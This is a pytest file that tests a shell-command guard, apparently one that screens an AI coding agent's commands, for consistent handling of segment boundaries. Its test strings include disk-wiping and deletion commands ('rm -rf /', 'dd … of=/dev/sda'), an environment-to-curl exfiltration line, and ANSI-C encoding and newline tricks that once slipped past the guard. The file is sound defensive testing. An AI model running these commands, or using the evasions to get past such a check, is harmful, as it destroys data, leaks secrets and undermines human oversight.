"""Where one command segment ends is defined ONCE, and every destructive or
credential detector reads from that one definition.

⚠ THE BUG CLASS, NOT THREE INSTANCES. Each destructive/credential detector used
to carry its own `[^|;&]` idea of a segment boundary, and those copies had
drifted: they omitted the newline that `_SEGMENT_END` treats as a separator. So a
value on the NEXT line spliced into a verb's operands — `cp /dev/zero /dev/sda`
followed by a newline and `echo done` read its last operand as `done`, and the
raw block device slipped past. This file pins the shared definition and, with a
self-discovering guard, fails if ANY engine pattern (present or future) treats
`; | &` as a segment boundary but forgets the newline.

The behavioural half proves the fix is catch-MORE-never-less: the values that
slipped past are now caught, everything caught before is still caught (including
the `\\<newline>` line continuation, which bash joins into one command), and the
one case that flips — a BARE newline between a verb and a later token — flips the
correct way, because bash runs those as two separate commands.
"""
from __future__ import annotations

import re

import pytest

from core import engine
from core.probes import NullWorld
from core.types import Action, ActionKind, SessionState

PROJECT = "/work/repo"
NL = "\n"                     # a bare newline: bash ends the command here
CONT = "\\" + "\n"           # backslash-newline: bash joins the two lines


def ex(command: str, cwd: str = PROJECT) -> Action:
    return Action("s", 1, ActionKind.EXEC, (), command, None, None, None,
                   cwd, (PROJECT,), "claude-code")


def verdict(command: str, cwd: str = PROJECT):
    state = SessionState(session_id="s", seq=1)
    state.workspace_roots = [PROJECT]
    state.scratch_roots = []
    return engine.decide(ex(command, cwd), state, NullWorld())


# ═══════════════════════════════════════════════════════════ the shared source

def test_segment_end_treats_a_bare_newline_and_the_separators_as_boundaries():
    for sep in (";", "|", "&", "\n"):
        assert engine._SEGMENT_END.match(sep), sep
    assert not engine._SEGMENT_END.match("x")


def test_not_segment_end_stops_at_a_bare_newline_but_crosses_a_continuation():
    atom = re.compile(engine._NOT_SEGMENT_END)
    # A normal character stays in the segment; a separator or a bare newline ends
    # it (the atom must NOT consume them).
    assert atom.match("x")
    for sep in (";", "|", "&", "\n"):
        assert not atom.match(sep), sep
    # A backslash-newline is a line continuation bash erases: the atom crosses it
    # as one unit, so a span does not stop there. This is what keeps
    # `find /etc \<newline>-delete` — one deleting command — caught.
    m = atom.match(CONT)
    assert m and m.group(0) == CONT, repr(m.group(0) if m else None)


# ══════════════════════════════════════════ the permanent structural guard
#
# ⚠ HOW A "SEGMENT SPAN" IS RECOGNISED, AND WHY BY THE REGEX ENGINE, NOT BY ITS
# SPELLING. A negated class `[^…]` is a segment span when it treats all three shell
# separators `; | &` as boundaries — i.e. EXCLUDES each of them. The earlier form
# of this guard decided that with substring tests on the class TEXT
# (`";" in body and …`) and searched the text for a literal `\n`/`\s`. That was
# already order- and extra-char-independent, but it read the SPELLING: a class that
# wrote the separators as escapes — `[^\x3b\x7c\x26]` is `; | &` to bash and to re,
# yet holds no literal `;` — slipped straight through, and a class that excluded the
# newline as `\x0a` was FALSELY flagged. So the decision is now made by the regex
# engine itself: compile the class and ASK whether it matches each character. Order,
# extra characters, and escapes all collapse to the one question that matters —
# "does this class match `;` / `|` / `&` / newline?".


def _negated_classes(pattern: str) -> list[str]:
    """Bodies of every `[^...]` in a regex pattern string (handles `\\]`)."""
    return re.findall(r"\[\^((?:\\.|[^\]])*)\]", pattern)


def _engine_regexes():
    """Every module-level compiled pattern in core.engine.

    ⚠ MODULE-LEVEL ONLY — a KNOWN, NARROW GAP, named not hidden. A regex built with
    `re.compile` INSIDE a function body is a local, never an attribute of the
    module, so it is not walked here. Today core.engine hand-rolls no separator
    class inside a function — every span-bearing detector is a module constant, and
    the shared ones derive from `_NOT_SEGMENT_END` — so the guard is COMPLETE for
    the engine as it stands. A FUTURE function-local `[^|;&]` would escape this
    discovery; that boundary is pinned by
    test_the_discovery_gap_for_function_local_regexes_is_documented."""
    for name, obj in vars(engine).items():
        if isinstance(obj, re.Pattern):
            yield name, obj.pattern


def _class_matches(body: str, char: str) -> bool:
    """Does the negated class `[^body]` MATCH `char`? Decided by re, so the answer
    is independent of how `body` spells its members — character order, extra
    characters, and `\\x`/`\\0`/`\\u` escapes all collapse to the same question. A
    body that cannot form a class answers False."""
    try:
        return re.compile("[^" + body + "]").match(char) is not None
    except re.error:
        return False


def _class_is_a_segment_span(body: str) -> bool:
    """`[^body]` treats all three shell separators as boundaries — it EXCLUDES each
    of `; | &` (does not match them). Spelling-independent."""
    return not any(_class_matches(body, sep) for sep in (";", "|", "&"))


def _class_excludes_newline(body: str) -> bool:
    """`[^body]` ends a segment at the newline too — it does NOT match `\\n`.
    Satisfied by `\\n`, `\\s`, `\\x0a`, an actual newline, or any range covering it,
    because the regex engine decides it rather than a substring search."""
    return not _class_matches(body, "\n")


def _is_drifted_segment_class(body: str) -> bool:
    """A segment-span class that forgot the newline — the exact drift from
    `_SEGMENT_END` this file exists to forbid. The continuation-aware shared form
    `_NOT_SEGMENT_END` = `(?:\\\\\\n|[^;|&\\n])` is NOT a drift: its inner class
    excludes the newline, so this returns False for it."""
    return _class_is_a_segment_span(body) and not _class_excludes_newline(body)


def test_every_segment_span_in_the_engine_excludes_the_newline():
    """⚠ THE GUARD AGAINST THE WHOLE CLASS. A negated class that treats all three
    shell separators (`; | &`) as boundaries is a SEGMENT SPAN, and a segment ends
    at a newline too — so such a class MUST also exclude the newline. This is
    self-discovering: it walks every module-level compiled pattern in the engine
    (see the gap note on `_engine_regexes`), so a NEW module-level detector that
    hand-rolls a separator class and omits the newline fails here the moment it is
    added, without being listed anywhere. Membership is decided by the regex engine
    (`_is_drifted_segment_class`), so reordering the class, padding it with extra
    characters, or writing the separators / newline as escapes cannot dodge it."""
    offenders = [
        (name, body)
        for name, pattern in _engine_regexes()
        for body in _negated_classes(pattern)
        if _is_drifted_segment_class(body)
    ]
    assert not offenders, (
        "segment-span classes that treat ; | & as boundaries but not the "
        f"newline (drifted from _SEGMENT_END): {offenders}")


def test_the_discovery_gap_for_function_local_regexes_is_documented():
    """⚠ WHAT THIS GUARD DOES AND DOES NOT CATCH — stated plainly, not implied.

      • COVERED: every module-level `re.Pattern` in core.engine, each of its
        separator classes judged SEMANTICALLY for the missing newline (order-,
        extra-char-, and escape-independent).
      • NOT COVERED: a separator class compiled INSIDE a function body. The walk in
        `_engine_regexes` sees module attributes only. There is no such class in the
        engine today (the span-bearing constants below are all present in the walk),
        so nothing escapes right now — but a future function-local one would, until
        discovery is widened.

    This is a DISCOVERY gap, not a judgement gap: were such a body reached, the
    semantic check would flag it (asserted below). Closing it would mean scanning
    engine source text, which also reads comments and docstrings — this repo's own
    quote `[^|;&]` as the old bug — and would false-positive, so per the task it is
    documented here rather than bolted on blindly."""
    walked = {name for name, _ in _engine_regexes()}
    # Discovery works for the covered set: representative span-bearing module
    # constants ARE walked — evidence that no separator class hides in a function.
    assert {"_COPY_VERB", "_DD_OF"} <= walked
    # The gap is real: a class compiled in a function never reaches the walk …
    local_pattern = re.compile(r"pre[^|;&]post")     # function-local, omits \n
    assert local_pattern.pattern not in {p for _, p in _engine_regexes()}, (
        "a function-local pattern unexpectedly appeared in the module walk")
    # … but the JUDGEMENT would catch its body if it did, so only discovery is
    # missing, never the verdict.
    assert _is_drifted_segment_class("|;&")


def test_the_guard_catches_drifted_classes_regardless_of_spelling():
    """⚠ THE KEY REGRESSION PROOF. A drifted separator class must be flagged however
    it is spelled — reordered, padded with extra characters, or with its separators
    written as escapes. The escaped form is the one the PRE-HARDENING substring
    check missed; it is reproduced here so the improvement cannot silently regress.
    Each `body` is the content of a `[^body]` class that omits the newline, so each
    IS a boundary drift and MUST be caught."""
    # The pre-hardening check, reproduced ONLY to show the gap it left: it read the
    # class TEXT, requiring the LITERAL characters ; | & and a literal \n / \s.
    def _old_substring_check(body: str) -> bool:
        if ";" in body and "|" in body and "&" in body:
            return "\\n" not in body and "\\s" not in body
        return False

    # (label, class body) — every one omits the newline, so every one must flag.
    drifted = [
        ("reordered",        r"&;|\t"),           # [^&;|\t]
        ("extra chars",      r"|;&Q\t"),          # [^|;&Q\t]
        ("literal space",    r"|;& "),            # [^|;& ] — space is not a newline
        ("hex-escaped seps", r"\x3b\x7c\x26\t"),  # [^\x3b\x7c\x26\t] == [^;|&\t]
    ]
    for label, body in drifted:
        assert _is_drifted_segment_class(body), f"guard missed drift: {label} [^{body}]"

    # STRONGER, NOT JUST DIFFERENT: the hex-escaped drift is a real `; | &` boundary
    # class that omits the newline, yet the old substring check did NOT flag it (no
    # literal `;` in the text). This assertion would PASS the old guard's logic and
    # FAILS it — proving the strengthening.
    hex_body = r"\x3b\x7c\x26\t"
    assert not _old_substring_check(hex_body), (
        "precondition: the OLD substring check should have missed the escaped drift")
    assert _is_drifted_segment_class(hex_body), (
        "the strengthened guard must catch the escaped drift the old one missed")

    # NEVER MORE: forms that genuinely exclude the newline are NOT flagged — the
    # `\n`, `\s`, `\x0a`, and actual-newline spellings, plus the shared boundary
    # atom's own inner class.
    for ok_body in (r"|;&\n", r"|;&\s", r"|;&\x0a", ";|&" + "\n"):
        assert not _is_drifted_segment_class(ok_body), f"false positive on [^{ok_body}]"
    inner = _negated_classes(engine._NOT_SEGMENT_END)
    assert inner and not any(_is_drifted_segment_class(b) for b in inner), (
        f"the shared boundary atom was flagged as a drift: {inner}")
    # And the old text check FALSELY flags the `\x0a` form — evidence the new,
    # engine-decided check is more PRECISE too, not merely broader.
    assert _old_substring_check(r"|;&\x0a") and not _is_drifted_segment_class(r"|;&\x0a")


# The destructive/credential detectors whose span is embedded in the pattern
# (not a call to `_SEGMENT_END`). Each MUST be built from the shared atom, so its
# boundary set is literally the shared one and cannot drift independently.
_SHARED_ATOM_DETECTORS = [
    "_DD_OF", "_MKFS", "_WRITES_LAST", "_WRITES_ANY", "_FIND_DESTROYS",
    "_FORCE_PUSH", "_BRANCH_FORCE_DELETE", "_RESET_HARD",
    "_ENV_DUMP_TO_NET", "_CLIPBOARD_WRITE",
]


@pytest.mark.parametrize("name", _SHARED_ATOM_DETECTORS)
def test_detector_uses_the_shared_boundary_atom(name):
    pattern = getattr(engine, name).pattern
    assert engine._NOT_SEGMENT_END in pattern, (
        f"{name} does not build its segment span from _NOT_SEGMENT_END; a "
        "per-detector copy is exactly the drift this file exists to prevent")


# ═══════════════════════════════════════════ C1 · find … -delete / -exec rm

def test_find_delete_is_caught_plain_and_across_a_continuation():
    # NEVER LESS: both were caught before the fix and must stay caught.
    assert verdict("find / -delete").rule_id == "catastrophic_delete"
    assert verdict("find /etc " + CONT + "-delete").rule_id == "catastrophic_delete"
    assert verdict("find /usr " + CONT + "-exec rm -rf {} +").rule_id == \
        "catastrophic_delete"


def test_find_across_a_bare_newline_is_not_one_delete_command():
    """⚠ THE CORRECT FLIP. `find /etc` <newline> `-delete` is two commands to
    bash — `find /etc` lists, `-delete` is a separate (missing) command — so it
    deletes nothing and must not be a catastrophic delete. The old `[^|;&]` span
    crossed the bare newline and paired them; the shared boundary does not."""
    assert engine.find_destroys_a_catastrophic_root(ex("find /etc" + NL + "-delete")) is None
    assert verdict("find /etc" + NL + "-delete").rule_id != "catastrophic_delete"


# ═══════════════════════ C2 · cp / mv / install writing a raw block device

@pytest.mark.parametrize("verb", ["cp", "mv", "install"])
def test_write_to_a_raw_device_is_caught_even_with_a_following_line(verb):
    """⚠ THE CLOSED MISS. The device is the LAST operand of the copy; before the
    fix the span ran past the newline into `echo done`, so `done` became the last
    operand and the device slipped past. Now the segment ends at the newline."""
    plain = f"{verb} /dev/zero /dev/sda"
    spliced = plain + NL + "echo done"
    assert verdict(plain).rule_id == "catastrophic_overwrite", plain
    assert verdict(spliced).rule_id == "catastrophic_overwrite", spliced


def test_dd_mkfs_and_tee_to_a_device_survive_a_following_line():
    """Hardening the siblings: dd / mkfs / tee to a device, with a second line
    after, stay caught rather than having the second line absorbed into the span."""
    for cmd in (f"dd if=/dev/zero of=/dev/sda{NL}echo done",
                f"mkfs.ext4 /dev/sda{NL}echo done",
                f"tee /dev/sda < img{NL}echo done"):
        assert verdict(cmd).rule_id == "catastrophic_overwrite", cmd


def test_a_device_as_a_copy_source_still_does_not_fire():
    """NEVER MORE than intended: a device as the SOURCE is a backup image, not an
    overwrite, and must stay quiet — the boundary change does not touch that."""
    assert verdict("dd if=/dev/sda of=disk.img").rule_id != "catastrophic_overwrite"
    assert verdict("cp /dev/sda ./backup.img").rule_id != "catastrophic_overwrite"


# ═══════════════════════════════ C3 · an ANSI-C-encoded destructive target

def test_ansi_c_encoded_delete_target_is_caught_like_its_plaintext():
    """The decode added to the shared `_bash_unquote` reaches the destructive
    matchers too: `$'\\x2f'` is `/` to bash, so both the `rm` and the `find`
    forms must DENY exactly as their plaintext spellings do."""
    for encoded, plain in ((r"rm -rf $'\x2f'", "rm -rf /"),
                           (r"find $'\x2f' -delete", "find / -delete")):
        v_enc, v_plain = verdict(encoded), verdict(plain)
        assert v_plain.rule_id == "catastrophic_delete", plain
        assert v_enc.decision.value == "DENY", (encoded, v_enc.rule_id)
        assert v_enc.rule_id == v_plain.rule_id, (encoded, v_enc.rule_id)


def test_ansi_c_decoder_keeps_undecodable_escapes_literal_never_partial():
    """⚠ A DECODER MUST NOT PARTIALLY DECODE. An escape bash does not resolve
    keeps its backslash (`\\z` -> `\\z`), one with no hex digit keeps `\\x`/`\\u`,
    and an OUT-OF-RANGE codepoint keeps the WHOLE escape — backslash, `u`/`U`, and
    the digits — never dropping the digits it read. Dropping them would be exactly
    the partial decode that can turn a benign string into a different one. The
    decoder is also total: it never raises on malformed input."""
    assert engine._bash_unquote(r"$'\z'") == "\\z"
    assert engine._bash_unquote(r"$'\x'") == "\\x"
    assert engine._bash_unquote(r"$'\xg'") == "\\xg"
    assert engine._bash_unquote(r"$'\u'") == "\\u"
    # An OVER-RANGE codepoint (chr() raises) keeps the whole escape — backslash,
    # `U`, and every consumed digit — never a partial decode that drops them.
    assert engine._bash_unquote(r"$'\UFFFFFFFF'") == "\\UFFFFFFFF"
    # A surrogate \u resolves to that codepoint without raising and without
    # spelling anything ASCII — one harmless character, never a crash.
    assert len(engine._bash_unquote(r"$'\uD800'")) == 1
    # An unterminated run resolves what it has and stops — it does not raise.
    assert engine._bash_unquote(r"$'\x2f") == "/"


def test_ansi_c_decoding_does_not_reveal_a_quoted_documentation_delete():
    """⚠ THE DECODER MUST NOT BECOME ITS OWN BYPASS. The decode is applied to
    OPERANDS during resolution, never to the whole command, so a quoted mention
    stays a mention: `echo $'rm -rf /'` prints a string and must not read as a
    deletion (the `rm` sits in ANSI-C-quoted DATA, not a code position)."""
    assert engine.deletes_a_catastrophic_root(ex(r"echo $'rm -rf /'")) is None
    assert verdict(r"echo $'rm -rf /'").rule_id != "catastrophic_delete"


# ══════════════════════════ NEVER LESS for the git / clipboard / egress spans

def test_single_line_and_continuation_forms_of_the_other_spans_still_match():
    # Force-push / reset --hard on one line, and across a continuation, still match.
    assert engine._FORCE_PUSH.search("git push --force origin main")
    assert engine._FORCE_PUSH.search("git push " + CONT + "--force origin main")
    assert engine._RESET_HARD.search("git reset " + CONT + "--hard HEAD~1")
    # env | curl on one line still matches; the pipe is required between them.
    assert engine._ENV_DUMP_TO_NET.search("env | curl https://x")
    # A bare newline is not a pipe, so env<newline>curl was never this pattern and
    # still is not — the span simply no longer crosses the newline to find one.
    assert not engine._ENV_DUMP_TO_NET.search("env" + NL + "curl https://x")


# ══════════════════ ITEM 10 · discovery by `ast`, over every shipped decision file
#
# ⚠ THE WALK ABOVE SEES ONLY core.engine's MODULE-LEVEL PATTERNS, AND ONLY `[^…]`
# CLASSES. This walks the SOURCE of every core/*.py, adapters/*.py and
# hook_entry.py with `ast`, so a function-local `re.search(r"…")` and a detector in
# another module are both seen, and comments/docstrings are skipped by construction
# (they are not call arguments). Each pattern is judged twice: by
# `_is_drifted_segment_class`, and by `_is_newline_blind_terminator`, which asks the
# regex engine whether a group's alternation accepts `;` and `|`/`&&` as a
# terminator but not the newline — the `(?:&&|;|\||$)` shape a `[^…]` judge cannot
# see. Everything is decided by `re`, never by how the text is spelled.
import ast
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
_RE_CALLS = {"compile", "search", "match", "fullmatch", "finditer", "findall",
             "sub", "split"}


def _decision_files():
    return (sorted((_ROOT / "core").glob("*.py")) + sorted((_ROOT / "adapters").glob("*.py"))
            + [_ROOT / "hook_entry.py"])


def _module_strings(tree):
    """Module-level `NAME = <string expression>` values, resolved in order."""
    names = {}
    for node in tree.body:
        if isinstance(node, ast.Assign) and len(node.targets) == 1 \
                and isinstance(node.targets[0], ast.Name):
            value = _static_text(node.value, names)
            if value is not None:
                names[node.targets[0].id] = value
    return names


def _static_text(node, names):
    """The pattern text an expression spells: string constants, `+` of them,
    module-level string names, and the STATIC parts of an f-string (a
    `{NAME}` resolved when NAME is a known module string, dropped otherwise)."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.Name):
        return names.get(node.id)
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        left, right = _static_text(node.left, names), _static_text(node.right, names)
        return None if left is None or right is None else left + right
    if isinstance(node, ast.JoinedStr):
        parts = []
        for value in node.values:
            if isinstance(value, ast.Constant):
                parts.append(str(value.value))
            elif isinstance(value, ast.FormattedValue):
                parts.append(_static_text(value.value, names) or "")
        return "".join(parts)
    return None


def _discovered_patterns(path):
    """(line, pattern text) for the first argument of every re.<call> in `path`."""
    tree = ast.parse(path.read_text(encoding="utf-8"))
    names = _module_strings(tree)
    found = []
    for node in ast.walk(tree):
        if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                and node.func.attr in _RE_CALLS
                and isinstance(node.func.value, ast.Name) and node.func.value.id == "re"
                and node.args):
            text = _static_text(node.args[0], names)
            if text is not None:
                found.append((node.lineno, text))
    return found


def _groups(pattern):
    """The body of every parenthesised group, with its `?:`/`?P<n>`/lookaround
    prefix removed. Escapes and `[...]` classes are skipped while scanning."""
    bodies, stack, i, in_class = [], [], 0, False
    while i < len(pattern):
        c = pattern[i]
        if c == "\\":
            i += 2
            continue
        if in_class:
            in_class = c != "]"
        elif c == "[":
            in_class = True
            if pattern[i + 1:i + 2] == "]":
                i += 1
        elif c == "(":
            stack.append(i)
        elif c == ")" and stack:
            body = pattern[stack.pop() + 1:i]
            bodies.append(re.sub(r"^\?(?::|P<\w+>|<?[=!])", "", body))
        i += 1
    return bodies


def _is_newline_blind_terminator(body):
    """A group that ends a command at `;` and at `|` or `&&` — each alternative
    taken WHOLE — but not at a newline: a separator alternation that drifted.
    It must refuse ordinary text too, or `(\\S+)` would read as a terminator."""
    try:
        group = re.compile(f"(?:{body})")
    except re.error:
        return False
    whole = lambda text: group.fullmatch(text) is not None
    return (whole(";") and (whole("|") or whole("&&")) and not whole("\n")
            and not whole("a") and not whole("x1"))


def _offenders(paths):
    out = []
    for path in paths:
        for line, text in _discovered_patterns(path):
            where = f"{path.relative_to(_ROOT) if path.is_relative_to(_ROOT) else path.name}:{line}"
            out += [(where, "class", f"[^{b}]") for b in _negated_classes(text)
                    if _is_drifted_segment_class(b)]
            out += [(where, "alternation", f"({b})") for b in _groups(text)
                    if _is_newline_blind_terminator(b)]
    return out


# ⚠ THE FINDINGS in shipped code: NONE. The one real newline-blind terminator
# item 10 pinned — `_GIT_ADD`'s `(&&|;|\||$)` — was fixed by item D and is now
# built from `_NOT_SEGMENT_END`. A NEW one fails the test below.
_KNOWN_FINDINGS: set = set()
# The pattern item 10 found, kept verbatim so the judge is proven to still bite.
_GIT_ADD_BEFORE_ITEM_D = r"\bgit\s+add\s+(?:-\w+\s+)*(.+?)(?:&&|;|\||$)"


def test_every_regex_in_the_decision_files_is_discovered_and_judged():
    found = {(where.split(":")[0], kind, text) for where, kind, text in _offenders(_decision_files())}
    assert found == _KNOWN_FINDINGS, sorted(found - _KNOWN_FINDINGS)


def test_the_judge_still_catches_the_git_add_pattern_item_10_found(tmp_path):
    """The pin went to NONE because the code changed, not because the judge got
    blind: the old `_GIT_ADD` in a scratch module is still an offender."""
    scratch = tmp_path / "old_git_add.py"
    scratch.write_text(f"import re\n_GIT_ADD = re.compile({_GIT_ADD_BEFORE_ITEM_D!r})\n")
    assert re.compile(_GIT_ADD_BEFORE_ITEM_D).pattern == _GIT_ADD_BEFORE_ITEM_D
    offenders = _offenders([scratch])
    assert offenders, "the judge no longer sees the newline-blind terminator"
    assert {kind for _, kind, _ in offenders} == {"alternation"}


def test_the_ast_discovery_bites(tmp_path):
    """⚠ PROVEN TO FAIL on a planted drift, in the three places the old walk could
    not see: a function-local pattern, another module, an f-string span."""
    scratch = tmp_path / "scratch_detector.py"
    scratch.write_text(
        "import re\n"
        "_NOT_SEGMENT_END = r'(?:\\\\\\n|[^;|&\\n])'\n"
        "def detect(cmd):\n"
        "    if re.search(r'curl[^|;&]*evil', cmd):\n"          # local class, no \\n
        "        return 1\n"
        "    return re.findall(r'git add (.+?)(?:&&|;|\\|)', cmd)\n"  # alternation, no \\n
        "OK = re.compile(f'x{_NOT_SEGMENT_END}*y')\n")         # shared atom: fine
    kinds = sorted(kind for _where, kind, _text in _offenders([scratch]))
    assert kinds == ["alternation", "class"], _offenders([scratch])


def test_the_ast_discovery_sees_what_the_module_walk_misses():
    """Discovery is wider than `_engine_regexes`: other modules are walked, and the
    engine's own function-local patterns are reached (there are some today), in
    every part of the engine (tests/engine_source.py)."""
    from tests import engine_source
    via_ast = {text for engine_file in engine_source.paths()
               for _line, text in _discovered_patterns(engine_file)}
    via_module = {pattern for _name, pattern in _engine_regexes()}
    assert via_ast - via_module, "no function-local or unnamed pattern discovered"
    assert len(_decision_files()) > 5
